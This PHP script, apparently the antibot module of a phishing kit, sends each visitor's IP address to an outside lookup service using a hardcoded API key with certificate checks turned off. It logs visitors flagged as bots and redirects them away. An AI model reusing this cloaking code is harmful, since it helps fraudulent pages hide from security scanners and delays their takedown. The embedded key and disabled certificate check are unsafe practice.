<?php
//STANDARD BOT DETECTION BY AIDEN PEARCE
/*
 
 
 
  Algorithm RSA4, with twin-antibot detection system
 */
error_reporting(-1);

function botinho($native,$switch){
    
    if($switch == 1){
        
        $response = "http://highwall.space/check/?ip=".$native."&fingerprint=on&ispinfo=isp&flags=b&api=SKecCwlsiuTDuIT8gZT";
        $curl       = curl_init();
        curl_setopt($curl, CURLOPT_URL, $response);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        $content    = curl_exec($curl);
        curl_close($curl);
        $details  = json_decode($content, true);

        $bad   = $details["badbot"];
        $org   = $details["org"];
        $botorigin   = $details["botcountry"];
        $ok   = $details["success"];

        if(strpos($bad, 'true') !== false){
            markBot("BLOCKED (API)","../logz/botlist.txt");
            return true;
        }else{
            return false;
        }
        
    }elseif($switch == 0){
        return false;
    }
    
    
}

$razinro = getenv("REMOTE_ADDR");
if(botinho($razinro,bot_protect)){
    /* A bot has been detected based on your criteria
	 * and recorded
	 */
    header('location: '.  redirect_to);
	exit();
}



?>